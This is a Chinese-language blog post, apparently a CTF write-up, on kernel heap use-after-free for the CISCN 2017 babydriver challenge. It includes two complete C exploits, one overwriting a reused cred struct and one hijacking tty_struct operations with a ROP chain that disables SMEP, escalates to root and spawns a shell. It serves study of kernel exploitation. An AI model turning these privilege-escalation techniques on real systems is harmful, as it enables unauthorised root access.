@@ -1,0 +1,703 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="手腕疼死了，这几天啥都没干成……今天终于好点了 打算先做题，等对内存分配机制有点实感再细看源码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kernel Heap UAF">
+<meta property="og:url" content="http://akaieurus.github.io/2023/08/16/kernel-heap-uaf/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="手腕疼死了，这几天啥都没干成……今天终于好点了 打算先做题，等对内存分配机制有点实感再细看源码">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc22.jpg">
+<meta property="article:published_time" content="2023-08-16T09:46:00.000Z">
+<meta property="article:modified_time" content="2025-01-03T10:49:32.510Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="uaf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc22.jpg">
+  
+  
+  
+  <title>Kernel Heap UAF - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc22.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Kernel Heap UAF"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-16 17:46" pubdate>
+          2023年8月16日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          718 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Kernel Heap UAF</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>手腕疼死了，这几天啥都没干成……今天终于好点了</p>
+<p>打算先做题，等对内存分配机制有点实感再细看源码</p>
+<span id="more"></span>
+
+<p>从例题说起</p>
+<h1 id="例题：CISCN-2017-babydriver"><a href="#例题：CISCN-2017-babydriver" class="headerlink" title="例题：CISCN - 2017 - babydriver"></a>例题：CISCN - 2017 - babydriver</h1><p>这道题开了-enable-kvm，打断点要用hbreak（硬件断点）</p>
+<h2 id="覆写cred结构体"><a href="#覆写cred结构体" class="headerlink" title="覆写cred结构体"></a>覆写cred结构体</h2><p>思路就是释放的0xa8的堆块会被重新申请用作cred结构体，这样就能利用UAF将cred结构体的uid、guid改成0</p>
+<p>这种方法在较新版本的kernel中已经不可行了，因为新版本在创建cred_jar时设置了SLAB_ACCOUNT标志，当CONFIG_MEMCG_KMEM&#x3D;y（默认）cred_jar不会和相同大小的kmalloc_192合并</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 旧版本cred_init</span><br><span class="hljs-type">void</span> __init <span class="hljs-title function_">cred_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>	cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred), <span class="hljs-number">0</span>,<br>			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 新版本cred_init</span><br><span class="hljs-type">void</span> __init <span class="hljs-title function_">cred_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>	cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred),<br>				     <span class="hljs-number">0</span>, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以通过cat &#x2F;proc&#x2F;slabinfo查看kmem_cache，本机有cred_jar而qemu起的题目是没有的</p>
+<img src="/2023/08/16/kernel-heap-uaf/cred_jar.png" srcset="/img/loading.gif" lazyload class title="cred_jar">
+
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> fd1 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>);<br>    <span class="hljs-keyword">if</span>(fd1 &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Open Fail!&quot;</span>);<br>    <span class="hljs-type">int</span> fd2 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>);<br>    <span class="hljs-keyword">if</span>(fd2 &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Open Fail!&quot;</span>);<br>    <br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0xa8</span>);<br>    close(fd1);<br><br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Fork Fail!&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        write(fd2, buf, <span class="hljs-number">28</span>);<br><br>        <span class="hljs-keyword">if</span>(getuid() == <span class="hljs-number">0</span>)<br>        &#123;<br>            success_print(<span class="hljs-string">&quot;Get Root Successfully!&quot;</span>);<br>            system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            fail_print(<span class="hljs-string">&quot;Get Root Fail!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        wait(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><p>这种思路类似于FSOP（都是打结构体的跳转表）</p>
+<p>劫持&#x2F;dev&#x2F;ptmx伪终端的的tty_struct结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> &#123;</span><br>	<span class="hljs-type">int</span>	magic;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kref</span> <span class="hljs-title">kref</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>;</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">int</span> index;<br>    <br>    ……        <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>tty_operations跳转表长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class">			<span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br>	<span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>	<span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>	<span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>		      <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br><br>    ……<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>由于没有开启SMAP保护，内核态可以访问用户空间数据，所以可以在用户空间布置ROP链和fake tty_operarions，这里劫持write函数的指针，使用一个gadget可以使eax和esp的高4字节为0并交换两者的值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xffffffff8100008a</span> : xchg eax, esp ; ret<br></code></pre></td></tr></table></figure>
+
+<p>调用write函数的指令如下，此时rax是fake_operations的地址，是可控的，使高4字节为0时的地址还在用户空间，可以利用mmap获得这块内存</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:FFFFFFFF814DC0C3                 call    qword ptr [rax+<span class="hljs-number">38</span>h]<br></code></pre></td></tr></table></figure>
+
+<p>这样就完成了栈迁移，在mmap的区域布置提权的ROP链就行</p>
+<h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> XCHG_EAX_ESP_RET 0xffffffff8100008a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694          </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br>    <br>    commit_creds = <span class="hljs-number">0xffffffff810a1420</span>;<br>    prepare_kernel_cred = <span class="hljs-number">0xffffffff810a1810</span>; <br><br>    <span class="hljs-type">int</span> fd1 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>), fd2 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>);<br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);  <span class="hljs-comment">// tty_struct结构体大小为0x2e0</span><br>    close(fd1);<br><br>    <span class="hljs-type">int</span> tty_fd = open_dev(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> fake_ops[<span class="hljs-number">8</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, XCHG_EAX_ESP_RET&#125;;<br>    <span class="hljs-type">size_t</span> fake_stack = (<span class="hljs-type">size_t</span>)(&amp;fake_ops) &amp; <span class="hljs-number">0xffffffff</span>;<br>    <span class="hljs-type">size_t</span> * fake_stack_ptr = mmap((<span class="hljs-type">size_t</span>)(fake_stack &amp; <span class="hljs-number">0xfffffffffffff000</span>), <span class="hljs-number">0x10000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!fake_stack_ptr)<br>        fail_print(<span class="hljs-string">&quot;Mmap Fail!&quot;</span>);<br>    fake_stack_ptr = (<span class="hljs-type">size_t</span>)fake_stack;<br><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    fake_stack_ptr[i++] = POP_RDI_RET;<br>    fake_stack_ptr[i++] = <span class="hljs-number">0x6f0</span>;<br>    fake_stack_ptr[i++] = MOV_CR4_RDI_POP_RBP_RET;<br>    fake_stack_ptr[i++] = <span class="hljs-number">0</span>;<br>    fake_stack_ptr[i++] = (<span class="hljs-type">size_t</span>)get_root_privilige;<br>    fake_stack_ptr[i++] = SWAPGS_POP_RBP_RET;<br>    fake_stack_ptr[i++] = <span class="hljs-number">0</span>;<br>    fake_stack_ptr[i++] = IRETQ_RET;<br>    fake_stack_ptr[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    fake_stack_ptr[i++] = user_cs;<br>    fake_stack_ptr[i++] = user_rflags;<br>    fake_stack_ptr[i++] = user_sp + <span class="hljs-number">8</span>;<br>    fake_stack_ptr[i++] = user_ss;<br><br>    <span class="hljs-type">int</span> tty_cnt = <span class="hljs-number">4</span> + <span class="hljs-number">4</span> + <span class="hljs-number">8</span> + <span class="hljs-number">8</span>;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>];<br>    read(fd2, buf, tty_cnt);    <span class="hljs-comment">// 0xffff880005f03800</span><br><br>    *(<span class="hljs-type">size_t</span> *)(&amp;buf[tty_cnt]) = &amp;fake_ops;<br>    write(fd2, buf, tty_cnt + <span class="hljs-number">8</span>);<br><br>    <span class="hljs-type">int</span> buf1[] = &#123;<span class="hljs-number">0</span>&#125;;<br>    write(tty_fd, buf1, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Kernel/" class="category-chain-item">Kernel</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Kernel/Heap/" class="category-chain-item">Heap</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
+      
+        <a href="/tags/heap/" class="print-no-link">#heap</a>
+      
+        <a href="/tags/uaf/" class="print-no-link">#uaf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Kernel Heap UAF</div>
+      <div>http://akaieurus.github.io/2023/08/16/kernel-heap-uaf/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/18/kernel-heap-aaa/" title="Kernel Heap Arbitrary-Address-Allocation">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Kernel Heap Arbitrary-Address-Allocation</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/10/kernel-ROP-ret2dir/" title="Kernel ROP ret2dir">
+                        <span class="hidden-mobile">Kernel ROP ret2dir</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
